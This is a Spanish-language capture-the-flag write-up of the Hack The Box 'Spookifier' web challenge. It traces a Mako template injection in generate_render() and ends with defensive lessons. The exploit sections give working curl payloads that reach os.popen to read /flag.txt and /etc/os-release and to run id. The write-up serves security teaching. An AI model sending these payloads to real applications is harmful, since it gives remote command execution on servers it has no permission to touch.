---
title: "Spookifier"
description: "Writeup de Spookifier - Hack The Box - Web 100pts. Aplicación Mako (Python) que convierte texto a fuentes spooky; generate_render() pasa el resultado sin escapar a Template().render() → SSTI → RCE con ${self.module.cache.util.os.popen('cat /flag.txt').read()}."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - ssti
  - mako
  - python
  - rce
  - template-injection
  - werkzeug
---

# Spookifier

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

**Spookifier** es una aplicación Python (Werkzeug/2.0.0, Python 3.8.15) que convierte texto a varios "estilos de fuente" temáticos de Halloween. La vulnerabilidad central está en `util.py`: la función `generate_render()` toma el texto ya convertido y lo pasa directamente a `Template(result).render()` del motor de templates **Mako**, sin ningún tipo de escape. Esto permite inyectar expresiones Mako en el parámetro `text` de la URL, consiguiendo ejecución remota de código en el servidor.

---

## Reconocimiento

```bash
nmap -sSCV $IP -p $PORT
# PORT      STATE SERVICE VERSION
# Werkzeug httpd 2.0.0 (Python 3.8.15)
# Title: Name Spookifier
```

La aplicación acepta un parámetro GET `text`:

```
GET /?text=hello HTTP/1.1
```

Y devuelve `hello` convertido a cuatro fuentes distintas (estilos Unicode medievales, etc.).

---

## Análisis del código fuente

Al revisar el código fuente del challenge (`application/util.py`), se encuentran cuatro diccionarios de mapeo de fuentes (`font1`–`font4`). Las fuentes 1–3 sustituyen cada carácter por un equivalente Unicode estilizado. La `font4` devuelve los caracteres sin transformación (identidad para alfanuméricos y caracteres especiales).

La función crítica está en la línea 288:

```python
# util.py, línea 288
def generate_render(converted_fonts):
    # ...construye un string 'result' con los 4 bloques de texto...
    return Template(result).render()
```

El input del usuario (procesado por `font4` sin transformación para caracteres especiales como `$`, `{`, `}`) acaba dentro de `result`, que se pasa directamente a `Template().render()`. Mako evalúa `${...}` como expresiones Python, lo que permite ejecutar código arbitrario.

---

## Detección de SSTI

Primero verificamos que Mako evalúa expresiones:

```bash
curl -G 'http://$HOST/' --data-urlencode "text=\${7*7}"
# Respuesta: ...49... (confirma SSTI — Mako evaluó 7*7)
```

---

## Exploit — RCE y lectura de flag

El payload accede al módulo `os` a través del objeto `self` de Mako, que expone el cache del módulo:

```bash
curl -G 'http://$HOST/' \
  --data-urlencode "text=\${self.module.cache.util.os.popen('cat /flag.txt').read()}"
```

El servidor ejecuta `cat /flag.txt` a través de `os.popen()` y devuelve el resultado como parte del HTML renderizado:

```html
<div class="spooky-text">
  HTB{FLAG}
  ...
</div>
```

También se puede verificar el sistema operativo:

```bash
curl -G 'http://$HOST/' \
  --data-urlencode "text=\${self.module.cache.util.os.popen('cat /etc/os-release').read()}"
# NAME="Alpine Linux"
# VERSION_ID=3.16
```

---

## Por qué funciona esta ruta de acceso

En Mako, cuando se renderiza un template:
- `self` es el objeto de contexto del template en curso.
- `self.module` accede al módulo Python generado por Mako para ese template.
- `self.module.cache` es el módulo de cache de Mako.
- `self.module.cache.util` es el módulo `util.py` de la aplicación (ya importado).
- `self.module.cache.util.os` accede al módulo `os` importado en `util.py`.

Esta cadena de acceso permite llegar a `os.popen()` sin importar nada directamente.

---

## Cadena de Ataque

```text
1. GET /?text=hello → texto convertido a 4 fuentes spooky
       ↓
2. Analizar util.py → generate_render() pasa result a Template().render()
       ↓
3. font4 no transforma ${}, por lo que el payload llega sin modificar al motor Mako
       ↓
4. ${self.module.cache.util.os.popen('id').read()} → RCE confirmado
       ↓
5. Cambiar id por cat /flag.txt → flag en la respuesta HTML
```

---

## Lecciones Aprendidas

- **No usar Template con input del usuario**: `Template(user_input).render()` es equivalente a `eval()` en Python. El input del usuario nunca debe ser tratado como template.
- **Mako y acceso a módulos desde templates**: a diferencia de Jinja2, Mako expone `self.module` que da acceso directo al módulo Python del template y sus imports — la cadena de escape es mucho más directa.
- **font4 como vector**: las fuentes que no transforman caracteres especiales (como `$`, `{`, `}`) preservan el payload intacto. Si hubiera escapado estos caracteres, la inyección fallaría.
- **SSTI vs CSTI**: verificar siempre con `${7*7}` o expresiones simples antes de intentar RCE — confirma el motor de templates y evita pruebas ciegas.

---

## Referencias

- [Mako Templates — Documentación](https://docs.makotemplates.org/en/latest/syntax.html)
- [HackTricks — SSTI Mako](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#mako-python)
- [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection)
